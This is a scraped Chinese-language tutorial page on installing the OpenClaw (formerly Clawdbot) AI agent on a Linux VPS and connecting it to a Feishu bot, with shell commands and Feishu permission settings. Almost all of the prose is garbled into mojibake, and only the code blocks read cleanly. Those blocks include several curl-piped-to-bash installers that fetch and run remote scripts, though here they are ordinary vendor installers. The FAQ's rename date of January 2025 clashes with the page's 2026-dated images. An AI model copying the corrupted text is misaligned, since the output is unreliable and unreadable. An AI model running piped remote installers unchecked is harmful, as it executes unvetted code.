                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">ä¿å§†çº§ OpenClaw ï¼ˆåŸ Clawdbotï¼‰é£ä¹¦å¯¹æ¥æ•™ç¨‹ æ‰‹æŠŠæ‰‹æ•™ä½ æ­å»º AI åŠ©æ‰‹</h2>
<p>OpenClaw æ˜¯ä¸€æ¬¾å¼€æºçš„æœ¬åœ° AI åŠ©æ‰‹,æ”¯æŒåœ¨ä½ è‡ªå·±çš„æœåŠ¡å™¨ä¸Šéƒ¨ç½²,é€šè¿‡é£ä¹¦ã€WhatsAppã€Telegram ç­‰èŠå¤©å·¥å…·äº¤äº’ã€‚ä¸äº‘ç«¯ SaaS æœåŠ¡ä¸åŒ,OpenClaw è®©ä½ å®Œå…¨æŒæ§æ•°æ®éšç§,å¯ä»¥æ‰§è¡Œç³»ç»Ÿå‘½ä»¤ã€æµè§ˆç½‘é¡µã€ç®¡ç†æ–‡ä»¶,ç”šè‡³ç¼–å†™ä»£ç ã€‚æœ¬æ•™ç¨‹å°†æ‰‹æŠŠæ‰‹æ•™ä½ åœ¨ Linux ç³»ç»Ÿä¸‹å®‰è£… OpenClaw å¹¶å¯¹æ¥é£ä¹¦æœºå™¨äºº,æ‰“é€ ä¸“å±çš„æ™ºèƒ½åŠ©ç†ã€‚</p>
<blockquote>
<p>æ³¨æ„ï¼šæœ¬æ•™ç¨‹åœ¨ Linux ç³»ç»Ÿä¸‹è¿›è¡Œ</p>
</blockquote>
<h3 data-id="heading-1">OpenClaw æ˜¯ä»€ä¹ˆï¼Ÿ</h3>
<p>OpenClaw(åŸå Clawdbot,åæ›´åä¸º Moltbot,ç°æ­£å¼å‘½åä¸º OpenClaw)æ˜¯ä¸€ä¸ªè¿è¡Œåœ¨ä½ æœ¬åœ°ç¯å¢ƒçš„é«˜æƒé™ AI æ™ºèƒ½ä½“ã€‚å®ƒçš„æ ¸å¿ƒç‰¹æ€§åŒ…æ‹¬ï¼š</p>
<ul>
<li><strong>æœ¬åœ°éƒ¨ç½²</strong>ï¼šè¿è¡Œåœ¨ä½ çš„æœåŠ¡å™¨æˆ–ç”µè„‘ä¸Š,æ•°æ®å®Œå…¨è‡ªä¸»å¯æ§</li>
<li><strong>å¤šå¹³å°æ”¯æŒ</strong>ï¼šæ”¯æŒé£ä¹¦ã€WhatsAppã€Telegramã€Discordã€Slack ç­‰ä¸»æµèŠå¤©å·¥å…·</li>
<li><strong>æµè§ˆå™¨æ§åˆ¶</strong>ï¼šå¯ä»¥æµè§ˆç½‘é¡µã€å¡«å†™è¡¨å•ã€æå–æ•°æ®</li>
<li><strong>ç³»ç»Ÿè®¿é—®</strong>ï¼šè¯»å†™æ–‡ä»¶ã€æ‰§è¡Œ Shell å‘½ä»¤ã€è¿è¡Œè„šæœ¬</li>
<li><strong>æŒä¹…åŒ–è®°å¿†</strong>ï¼šè®°ä½ä½ çš„åå¥½å’Œä¸Šä¸‹æ–‡,æˆä¸ºçœŸæ­£å±äºä½ çš„ AI</li>
<li><strong>æ’ä»¶æ‰©å±•</strong>ï¼šæ”¯æŒç¤¾åŒºæŠ€èƒ½æ’ä»¶,ç”šè‡³å¯ä»¥è‡ªå·±ç¼–å†™æ’ä»¶</li>
</ul>
<p>æ— è®ºæ˜¯é‚®ä»¶ç®¡ç†ã€æ—¥ç¨‹å®‰æ’ã€æ•°æ®æŸ¥è¯¢è¿˜æ˜¯ä»£ç ç¼–å†™,OpenClaw éƒ½èƒ½æˆä¸ºä½ çš„å¾—åŠ›åŠ©æ‰‹ã€‚</p>
<h3 data-id="heading-2">å‡†å¤‡å·¥ä½œ</h3>
<p>é¦–å…ˆå‡†å¤‡ä¸€å°é—²ç½®çš„äº‘æœåŠ¡å™¨æˆ– VPSï¼ˆæ¨èä½¿ç”¨é¦™æ¸¯æˆ–æµ·å¤–èŠ‚ç‚¹ï¼‰ã€‚ç”±äº OpenClaw è¿è¡Œæ—¶æƒé™è¾ƒå¤§ï¼Œå‡ºäºå®‰å…¨è€ƒè™‘ï¼Œä¸å»ºè®®åœ¨æœ¬åœ°æˆ–å·¥ä½œæœºä¸Šå®‰è£…ï¼Œæ¨èåœ¨ä¸€å°ç‹¬ç«‹çš„ç©ºæœåŠ¡å™¨ä¸Šéƒ¨ç½²ã€‚å‡†å¤‡å®Œæˆåï¼Œç™»å½•åˆ°æœåŠ¡å™¨ã€‚</p>
<h3 data-id="heading-3">å®‰è£…</h3>
<blockquote>
<p>å¦‚æœä½ ä¸æƒ³å®‰è£…ï¼Œå¯ä»¥ç›´æ¥ä½¿ç”¨é˜¿é‡Œäº‘çš„<a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.aliyun.com%2Factivity%2Fecs%2Fclawdbot%3FuserCode%3Doq2t54oi" target="_blank" title="https://www.aliyun.com/activity/ecs/clawdbot?userCode=oq2t54oi" ref="nofollow noopener noreferrer">Openclaw ä¸€é”®éƒ¨ç½² (åŸ Clawdbot)</a>ï¼Œéƒ¨ç½²ä¹‹åå¯ä»¥ç›´æ¥è·³åˆ°<a href="#%E5%AF%B9%E6%8E%A5%E9%A3%9E%E4%B9%A6" title="#%E5%AF%B9%E6%8E%A5%E9%A3%9E%E4%B9%A6">å¯¹æ¥é£ä¹¦</a>ã€‚</p>
</blockquote>
<p>ç¬¬ä¸€æ­¥å®‰è£… Git</p>
<pre><code class="hljs language-shell" lang="shell"><span class="hljs-meta prompt_"># </span><span class="bash">å®‰è£… Git</span>
sudo apt update
sudo apt install git -y
</code></pre>
<p>ç¬¬äºŒæ­¥å®‰è£… Node.js</p>
<pre><code class="hljs language-shell" lang="shell"><span class="hljs-meta prompt_"># </span><span class="bash">å®‰è£… NVM</span>
<span class="hljs-meta prompt_"># </span><span class="bash">å›½å†…ä½¿ç”¨ gitee çš„é•œåƒæº</span>
curl -o- https://gitee.com/RubyMetric/nvm-cn/raw/main/install.sh | bash
<span class="hljs-meta prompt_">
# </span><span class="bash">å›½å¤–ä½¿ç”¨</span>
curl -o- https://raw.githubusercontent.com/nvm-sh/nvm/v0.39.1/install.sh | bash
<span class="hljs-meta prompt_">
# </span><span class="bash">é‡æ–°åŠ è½½ç¯å¢ƒå˜é‡</span>
source ~/.bashrc
<span class="hljs-meta prompt_">
# </span><span class="bash">å®‰è£… Node.js 22</span>
nvm install 22
<span class="hljs-meta prompt_">
# </span><span class="bash">æŸ¥çœ‹ nodejs ç‰ˆæœ¬</span>
node -v # è¾“å‡º v22 å³å¯ï¼Œç‰ˆæœ¬åªè¦ 22 å°±è¡Œ
</code></pre>
<h3 data-id="heading-4">å®‰è£… Openclaw</h3>
<pre><code class="hljs language-shell" lang="shell"><span class="hljs-meta prompt_"># </span><span class="bash">ä½¿ç”¨å®˜æ–¹è„šæœ¬å®‰è£…</span>
curl -fsSL https://openclaw.bot/install.sh | bash
</code></pre>
<blockquote>
<p>æœåŠ¡å™¨åœ¨å›½å†…ï¼Œå¦‚æœå®‰è£…å¤±è´¥çš„è¯ï¼Œå¯èƒ½éœ€è¦è§£å†³ç½‘ç»œé—®é¢˜</p>
</blockquote>
<p>å…¶ä»–å¹³å°å®‰è£…æ–¹å¼è¯·å‚è€ƒ<a href="https://link.juejin.cn?target=https%3A%2F%2Fdocs.openclaw.bot%2Finstall%2Finstaller" target="_blank" title="https://docs.openclaw.bot/install/installer" ref="nofollow noopener noreferrer">Openclaw å®‰è£…æ–‡æ¡£ (åŸ Clawdbot)</a></p>
<p>ä½ ä¼šçœ‹åˆ°å¦‚ä¸‹å›¾è¾“å‡º
<img src="https://image.catchadmin.com/202601310803318.png" alt="Openclaw (åŸ Clawdbot) å®‰è£…è¿‡ç¨‹ - AI åŠ©æ‰‹éƒ¨ç½²åˆå§‹åŒ–" loading="lazy"/>
å¦‚æœé¦–æ¬¡å®‰è£…ï¼Œæ—¶é—´ä¼šå¾ˆé•¿ï¼Œéœ€è¦è€å¿ƒç­‰å¾…ã€‚
å¦‚æœæœ€åè¾“å‡ºå¦‚ä¸‹å†…å®¹ï¼š</p>
<pre><code class="hljs language-shell" lang="shell">â†’ npm install failed; cleaning up and retrying...
</code></pre>
<p>æ–°çš„è„šæœ¬æœåŠ¡å™¨å†…å­˜è¦æ±‚å˜é«˜äº†ï¼Œæ®æˆ‘ä½¿ç”¨ä¸‹æ¥ 2G å†…å­˜ï¼Œè‚¯å®šä¼š OOMï¼Œå¦‚æœå‡ºé”™çš„è¯ï¼Œå»ºè®®ä½¿ç”¨ <code>swap</code> æŠŠç¡¬ç›˜ç©ºé—´å½“ä½œäº¤äº’å†…å­˜ä½¿ç”¨ã€‚</p>
<p>æˆåŠŸä¹‹åä¼šè¾“å‡ºå¦‚ä¸‹å›¾ç‰‡
<img src="https://image.catchadmin.com/202601310805358.png" alt="Openclaw (åŸ Clawdbot) å®‰è£…æˆåŠŸ - AI æœºå™¨äººé…ç½®å‘å¯¼" loading="lazy"/>
ç¬¬ä¸€ä¸ªé€‰é¡¹é€‰æ‹© <code>yes</code>, å°±æ˜¯è¯¢é—®ä½ æ˜¯å¦çŸ¥é“é£é™©çš„ã€‚
ç¬¬äºŒæ­¥é€‰æ‹© <code>QuickStart</code>
<img src="https://image.catchadmin.com/202601281351166.png" alt="Openclaw (åŸ Clawdbot) QuickStart å¿«é€Ÿå¼€å§‹é€‰é¡¹" loading="lazy"/>
ç¬¬ä¸‰æ­¥é€‰æ‹©æ¨¡å‹æœåŠ¡å•†ï¼Œè¿™é‡Œé€‰æ‹© <code>Qwen</code>ï¼Œå…è´¹é¢åº¦å……è¶³ï¼Œé€‚åˆå…¥é—¨ä½¿ç”¨
<img src="https://image.catchadmin.com/202601281352080.png" alt="Openclaw (åŸ Clawdbot) é€‰æ‹© AI æ¨¡å‹æœåŠ¡å•† Qwen åƒé—®" loading="lazy"/>
é€‰æ‹©åƒé—®æ¨¡å‹åï¼Œä¼šæä¾›ä¸€ä¸ªé“¾æ¥ï¼Œå¤åˆ¶å¹¶åœ¨æµè§ˆå™¨ä¸­æ‰“å¼€ï¼Œå¦‚ä¸‹å›¾
<img src="https://image.catchadmin.com/202601281355542.png" alt="Openclaw (åŸ Clawdbot) åƒé—®æ¨¡å‹æˆæƒé“¾æ¥" loading="lazy"/>
æ‰“å¼€æµè§ˆå™¨åï¼Œä¼šçœ‹åˆ°å¦‚ä¸‹ç•Œé¢ã€‚ç”±äºæˆ‘å·²ç™»å½•è¿‡ï¼Œæ‰€ä»¥æ˜¾ç¤ºè´¦æˆ·ä¿¡æ¯ï¼›å¦‚æœå°šæœªç™»å½•ï¼ŒæŒ‰ç…§æç¤ºå®Œæˆç™»å½•å³å¯ã€‚
<img src="https://image.catchadmin.com/202601281356909.png" alt="Openclaw (åŸ Clawdbot) åƒé—® AI è´¦æˆ·ç™»å½•é¡µé¢" loading="lazy"/>
ç™»å½•å®Œæˆåï¼Œä¼šå‡ºç°ä»¥ä¸‹é€‰é¡¹ï¼Œæç¤ºé€‰æ‹©å¯¹åº”çš„åƒé—®æ¨¡å‹ï¼Œå¦‚ä¸‹å›¾
<img src="https://image.catchadmin.com/202601281358170.png" alt="Openclaw (åŸ Clawdbot) é€‰æ‹©åƒé—® AI æ¨¡å‹ç‰ˆæœ¬" loading="lazy"/></p>
<p>é€‰æ‹©é»˜è®¤æ¨¡å‹å³å¯ã€‚æ¥ä¸‹æ¥ä¼šæç¤ºé€‰æ‹© channelï¼Œè¿™é‡Œå…ˆè·³è¿‡ï¼Œåç»­å†æ·»åŠ </p>
<p><img src="https://image.catchadmin.com/202601281359123.png" alt="Openclaw (åŸ Clawdbot) channel æ¸ é“é…ç½®é€‰é¡¹" loading="lazy"/>
ç»§ç»­ä¸‹é¢é€‰æ‹© skillsï¼Œä¹Ÿæ˜¯é€‰æ‹© <code>No</code>ï¼Œå¦‚ä¸‹å›¾
<img src="https://image.catchadmin.com/202601281359786.png" alt="Openclaw (åŸ Clawdbot) skills æŠ€èƒ½é…ç½®é€‰é¡¹" loading="lazy"/>
ç»§ç»­ä¸‹é¢é€‰æ‹© hooksï¼Œä¹Ÿæ˜¯ä½¿ç”¨<code>ç©ºæ ¼</code>é€‰æ‹© <code>No</code>ï¼Œå¦‚ä¸‹å›¾
<img src="https://image.catchadmin.com/202601281400483.png" alt="Openclaw (åŸ Clawdbot) hooks é…ç½®é€‰é¡¹" loading="lazy"/>
ç„¶åç­‰å¾…å®‰è£…å®Œæˆï¼Œæœ€åä¼šå‡ºç°ä»¥ä¸‹é€‰é¡¹ï¼Œè¿™é‡Œé€‰æ‹© <code>TUI</code>
<img src="https://image.catchadmin.com/202601281403169.png" alt="Openclaw (åŸ Clawdbot) é€‰æ‹© TUI ç»ˆç«¯ç•Œé¢" loading="lazy"/>
å¦‚æœçœ‹åˆ° TUI èŠå¤©ç•Œé¢ï¼Œè¯´æ˜å®‰è£…æˆåŠŸï¼Œå¯ä»¥å°è¯•è¾“å…¥ <code>Hello</code> è¿›è¡Œæµ‹è¯•ã€‚
<img src="https://image.catchadmin.com/202601281404354.png" alt="Openclaw (åŸ Clawdbot) TUI èŠå¤©ç•Œé¢ - AI åŠ©æ‰‹å¯¹è¯æµ‹è¯•" loading="lazy"/>
ç„¶åç›´æ¥ä½¿ç”¨ <code>ctrl+c</code> å…ˆå…³é—­ï¼Œåé¢æˆ‘ä»¬å†æ¥è®¾ç½®</p>
<h4 data-id="heading-5">æŸ¥çœ‹æœåŠ¡</h4>
<p>å¯ä»¥ä½¿ç”¨ä¸‹é¢çš„å‘½ä»¤æ¥æŸ¥çœ‹</p>
<pre><code class="hljs language-shell" lang="shell">clawdbot status
</code></pre>
<p>ä¼šçœ‹åˆ°å¦‚ä¸‹å›¾çš„ç»“æœå°±è¯´æ˜æœåŠ¡å¯åŠ¨äº†
<img src="https://image.catchadmin.com/202601281449942.png" alt="Openclaw (åŸ Clawdbot) æœåŠ¡çŠ¶æ€æ£€æŸ¥ - AI åŠ©æ‰‹è¿è¡Œä¸­" loading="lazy"/></p>
<h4 data-id="heading-6">è®¿é—® Web UI é¢æ¿</h4>
<p>å¦‚ä½•è®¿é—®é¢æ¿ï¼ŸæœåŠ¡ç›‘å¬åœ¨ <code>http://127.0.0.1:18789/</code> ç«¯å£ä¸Šï¼Œæˆ‘ä»¬ç°åœ¨é€šè¿‡ ssh éš§é“æ¥è®¿é—®ï¼Œè¾“å…¥ä¸‹é¢çš„å‘½ä»¤</p>
<pre><code class="hljs language-shell" lang="shell">ssh -N -L 18789:127.0.0.1:18789 ç”¨æˆ·å@æœåŠ¡å™¨IP
<span class="hljs-meta prompt_"># </span><span class="bash">å›è½¦ä¹‹å</span>
ç”¨æˆ·å@æœåŠ¡å™¨IP's password: # è¾“å…¥å¯†ç 
</code></pre>
<p>ç„¶ååœ¨æµè§ˆå™¨æ‰“å¼€ <code>http://127.0.0.1:18789/</code>, ä½ ä¼šçœ‹åˆ° Dashboard äº†ï¼Œå¦‚ä¸‹å›¾
<img src="https://image.catchadmin.com/202601281509102.png" alt="Openclaw (åŸ Clawdbot) Web UI Dashboard æœªæˆæƒé¡µé¢" loading="lazy"/>
å›¾ä¸­æ˜¾ç¤ºçš„æ˜¯æœªæˆæƒçŠ¶æ€ï¼Œå›åˆ°æœåŠ¡å™¨ï¼Œè¾“å…¥ä»¥ä¸‹å‘½ä»¤</p>
<pre><code class="hljs language-shell" lang="shell">clawdbot dashboard
</code></pre>
<p>ä¼šçœ‹åˆ°ä¸‹é¢çš„é¢æ¿æ•°æ®
<img src="https://image.catchadmin.com/202601281530336.png" alt="Openclaw (åŸ Clawdbot) Dashboard URL è·å–å‘½ä»¤" loading="lazy"/>
å¤åˆ¶å¯¹åº”çš„ <code>Dashboard URL</code> åˆ°æµè§ˆå™¨æ‰“å¼€ï¼Œå³å¯æ­£å¸¸æŸ¥çœ‹èŠå¤©è®°å½•ã€‚
<img src="https://image.catchadmin.com/202601281532427.png" alt="Openclaw (åŸ Clawdbot) Web UI ç®¡ç†é¢æ¿ - AI åŠ©æ‰‹èŠå¤©è®°å½•" loading="lazy"/></p>
<p>è‡³æ­¤ Openclaw (åŸ Clawdbot) å·²å®‰è£…å®Œæˆï¼Œå¯ä»¥æ­£å¸¸è®¿é—®äº†ã€‚ç„¶åèŠå¤©æ¡†é‡Œé¢é¦–æ¬¡è¾“å…¥ <code>Hello</code>, <code>Clawdbot</code> ä¼šè¯¢é—®ä½ ä»–åº”è¯¥å«ä»€ä¹ˆï¼Œåº”è¯¥å«ä½ ä»€ä¹ˆã€‚å°±æ˜¯ä½ éœ€è¦ç»™å®ƒè®¾ç½®ä¸ªåå­—ï¼Œè¿˜æœ‰ bot æ”¹å«ä½ ä»€ä¹ˆã€‚ä½ å¯ä»¥åœ¨èŠå¤©æ¡†è¿™ä¹ˆè¾“å…¥</p>
<pre><code class="hljs language-shell" lang="shell">Name: Openclaw

My Name: Boss
</code></pre>
<h3 data-id="heading-7">å¯¹æ¥é£ä¹¦</h3>
<p>é¦–å…ˆå®‰è£…é£ä¹¦æ’ä»¶ï¼Œè¾“å…¥ä»¥ä¸‹å‘½ä»¤</p>
<pre><code class="hljs language-shell" lang="shell">clawdbot plugins install @m1heng-clawd/feishu
</code></pre>
<p>ç™»å½•é£ä¹¦å¼€æ”¾å¹³å° <a href="https://link.juejin.cn?target=https%3A%2F%2Fopen.feishu.cn%25EF%25BC%258C%25E7%2582%25B9%25E5%2587%25BB%25E3%2580%258C%25E5%25BC%2580%25E5%258F%2591%25E8%2580%2585%25E5%2590%258E%25E5%258F%25B0" target="_blank" title="https://open.feishu.cn%EF%BC%8C%E7%82%B9%E5%87%BB%E3%80%8C%E5%BC%80%E5%8F%91%E8%80%85%E5%90%8E%E5%8F%B0" ref="nofollow noopener noreferrer">open.feishu.cnï¼Œç‚¹å‡»ã€Œå¼€å‘è€…åå°</a> -&gt; åˆ›å»ºä¼ä¸šè‡ªå»ºåº”ç”¨ã€ï¼Œå¦‚ä¸‹å›¾
<img src="https://image.catchadmin.com/202601281539117.png" alt="é£ä¹¦å¼€æ”¾å¹³å°åˆ›å»ºä¼ä¸šè‡ªå»ºåº”ç”¨ - Openclaw å¯¹æ¥" loading="lazy"/>
ç„¶åç‚¹å‡»åˆ›å»ºåº”ç”¨ï¼Œå¦‚ä¸‹
<img src="https://image.catchadmin.com/202601281743642.png" alt="é£ä¹¦åˆ›å»ºåº”ç”¨ - Openclaw AI æœºå™¨äºº" loading="lazy"/>
åˆ›å»ºå®Œæˆåï¼Œé¦–å…ˆåˆ°å‡­æ®ç®¡ç†ä¸­è·å– App ID å’Œ App Secretï¼Œæ³¨æ„ä¿å­˜ï¼Œåç»­é…ç½®éœ€è¦ä½¿ç”¨ã€‚
<img src="https://image.catchadmin.com/202601281757469.png" alt="é£ä¹¦ App ID å’Œ App Secret å‡­æ®ç®¡ç†" loading="lazy"/>
ç„¶åæ·»åŠ æœºå™¨äººï¼Œå¦‚ä¸‹æ“ä½œ
<img src="https://image.catchadmin.com/202601281758607.png" alt="é£ä¹¦æ·»åŠ æœºå™¨äººèƒ½åŠ› - Openclaw AI åŠ©æ‰‹" loading="lazy"/>
é¦–å…ˆé…ç½®ä¸ªåå­—
<img src="https://image.catchadmin.com/202601281758721.png" alt="é£ä¹¦æœºå™¨äººåç§°é…ç½® - Openclaw" loading="lazy"/></p>
<p>é£ä¹¦çš„å…¶ä»–é…ç½®å…ˆæš‚åœï¼Œå›åˆ°æœåŠ¡å™¨é…ç½® Openclaw çš„é£ä¹¦å‚æ•°</p>
<h4 data-id="heading-8">æ·»åŠ é£ä¹¦é…ç½®</h4>
<pre><code class="hljs language-shell" lang="shell">clawdbot config set channels.feishu.appId "é£ä¹¦ app id"

clawdbot config set channels.feishu.appSecret "é£ä¹¦ app secret"

clawdbot config set channels.feishu.enabled true
<span class="hljs-meta prompt_">
# </span><span class="bash">æ¨èä½¿ç”¨ websocket</span>
clawdbot config set channels.feishu.connectionMode websocket

clawdbot config set channels.feishu.dmPolicy pairing

clawdbot config set channels.feishu.groupPolicy allowlist

clawdbot config set channels.feishu.requireMention true
</code></pre>
<p>é…ç½®å®Œæˆä¹‹åï¼Œé‡å¯</p>
<pre><code class="hljs language-shell" lang="shell">clawdbot gateway restart
</code></pre>
<p>é‡å¯å®Œæˆåå›åˆ°é£ä¹¦ï¼Œæ‰¾åˆ°ã€Œäº‹ä»¶å’Œå›è°ƒã€ï¼Œé€‰æ‹©é•¿è¿æ¥æ¨¡å¼ï¼Œå¦‚ä¸‹å›¾
<img src="https://image.catchadmin.com/202601281802128.png" alt="é£ä¹¦äº‹ä»¶å’Œå›è°ƒé…ç½® - Openclaw é•¿è¿æ¥æ¨¡å¼" loading="lazy"/>
å¦‚æœé…ç½®æˆåŠŸï¼Œè¯´æ˜è¿æ¥å·²å»ºç«‹ã€‚ç»§ç»­ä¸‹é¢çš„é…ç½®ï¼Œæ·»åŠ äº‹ä»¶ï¼Œé€‰æ‹©ã€Œæ¥æ”¶æ¶ˆæ¯ã€äº‹ä»¶
<img src="https://image.catchadmin.com/202601281811231.png" alt="é£ä¹¦æ·»åŠ æ¥æ”¶æ¶ˆæ¯äº‹ä»¶ - Openclaw AI åŠ©æ‰‹" loading="lazy"/>
äº‹ä»¶æ·»åŠ å®Œæˆä¹‹åï¼Œè¿˜éœ€è¦å¼€é€šæƒé™ï¼Œæœ‰ä»¥ä¸‹æƒé™å…¨éƒ¨å‹¾é€‰</p>




















<table><thead><tr><th>æƒé™</th><th>Scopeï¼ˆèŒƒå›´ï¼‰</th><th>Descriptionï¼ˆè¯´æ˜ï¼‰</th></tr></thead><tbody><tr><td>contact:user.base:readonly</td><td>ç”¨æˆ·ä¿¡æ¯</td><td>è·å–åŸºç¡€ç”¨æˆ·ä¿¡æ¯</td></tr><tr><td>im:message</td><td>æ¶ˆæ¯ å…¨éƒ¨å‹¾é€‰</td><td>å‘é€å’Œæ¥æ”¶æ¶ˆæ¯</td></tr></tbody></table>
<p>å¦‚ä¸‹å›¾
<img src="https://image.catchadmin.com/202601281545906.png" alt="é£ä¹¦æƒé™é…ç½® - Openclaw ç”¨æˆ·ä¿¡æ¯æƒé™" loading="lazy"/></p>
<p><img src="https://image.catchadmin.com/202601281549559.png" alt="é£ä¹¦æ¶ˆæ¯æƒé™é…ç½® - Openclaw AI æœºå™¨äºº" loading="lazy"/></p>
<p>ä»¥ä¸Šæ­¥éª¤å…¨éƒ¨å®Œæˆåï¼Œå³å¯ä¸æœºå™¨äººå¯¹è¯ã€‚ä½†åœ¨æ­¤ä¹‹å‰éœ€è¦å…ˆåˆ›å»ºä¸€ä¸ªç‰ˆæœ¬
<img src="https://image.catchadmin.com/202601281814848.png" alt="é£ä¹¦åº”ç”¨ç‰ˆæœ¬å‘å¸ƒ - Openclaw AI åŠ©æ‰‹ä¸Šçº¿" loading="lazy"/></p>
<blockquote>
<p>æ³¨æ„ï¼šæ¯æ¬¡ä¿®æ”¹é…ç½®åéƒ½éœ€è¦é‡æ–°å‘å¸ƒç‰ˆæœ¬ï¼Œå»ºè®®å…¨éƒ¨é…ç½®å®Œæˆåå†ç»Ÿä¸€å‘å¸ƒã€‚</p>
</blockquote>
<p>å‘å¸ƒå®Œæˆåï¼Œå›åˆ°é£ä¹¦å®¢æˆ·ç«¯ï¼Œå¯ä»¥çœ‹åˆ°åº”ç”¨å·²ä¸Šçº¿ï¼Œç‚¹å‡»æ‰“å¼€åº”ç”¨
<img src="https://image.catchadmin.com/202601281816608.png" alt="é£ä¹¦åº”ç”¨å‘å¸ƒæˆåŠŸ - Openclaw AI æœºå™¨äºº" loading="lazy"/>
å‘æœºå™¨äººå‘é€ <code>Hello</code>ï¼Œå³å¯æ”¶åˆ° Moltbot çš„å›å¤
<img src="https://image.catchadmin.com/202601281817700.png" alt="é£ä¹¦ Openclaw AI åŠ©æ‰‹å›å¤æµ‹è¯•æˆåŠŸ" loading="lazy"/></p>
<h3 data-id="heading-9">å¸¸è§é—®é¢˜ FAQ</h3>
<h4 data-id="heading-10">OpenClaw å’Œ Clawdbotã€Moltbot æ˜¯ä»€ä¹ˆå…³ç³»ï¼Ÿ</h4>
<p>OpenClaw æ˜¯è¯¥é¡¹ç›®çš„æœ€æ–°æ­£å¼åç§°ã€‚é¡¹ç›®æœ€åˆå« Clawdbotï¼Œåå› å•†æ ‡é—®é¢˜æ›´åä¸º Moltbotï¼Œæœ€ç»ˆåœ¨ 2025 å¹´ 1 æœˆæ­£å¼å®šåä¸º OpenClawã€‚ä¸‰è€…æ˜¯åŒä¸€ä¸ªé¡¹ç›®çš„ä¸åŒé˜¶æ®µå‘½åã€‚</p>
<h4 data-id="heading-11">OpenClaw æ”¯æŒå“ªäº› AI æ¨¡å‹ï¼Ÿ</h4>
<p>OpenClaw æ”¯æŒå¤šç§ AI æ¨¡å‹æœåŠ¡å•†ï¼ŒåŒ…æ‹¬ Anthropic Claudeã€OpenAI GPTã€é€šä¹‰åƒé—®ï¼ˆQwenï¼‰ã€KIMIã€å°ç±³ MiMo ç­‰ã€‚æœ¬æ•™ç¨‹ä½¿ç”¨é€šä¹‰åƒé—®æ˜¯å› ä¸ºå…¶å…è´¹é¢åº¦å……è¶³ï¼Œé€‚åˆå…¥é—¨å­¦ä¹ ã€‚</p>
<h4 data-id="heading-12">ä¸ºä»€ä¹ˆå®‰è£…æ—¶æç¤º npm install failedï¼Ÿ</h4>
<p>è¿™é€šå¸¸æ˜¯æœåŠ¡å™¨å†…å­˜ä¸è¶³å¯¼è‡´çš„ã€‚æ–°ç‰ˆæœ¬è„šæœ¬å¯¹å†…å­˜è¦æ±‚è¾ƒé«˜ï¼Œ2G å†…å­˜å¯èƒ½ä¼šå‡ºç° OOMï¼ˆå†…å­˜æº¢å‡ºï¼‰ã€‚å»ºè®®é…ç½® swap äº¤æ¢ç©ºé—´ï¼Œå°†ç¡¬ç›˜ç©ºé—´ä½œä¸ºè™šæ‹Ÿå†…å­˜ä½¿ç”¨ã€‚</p>
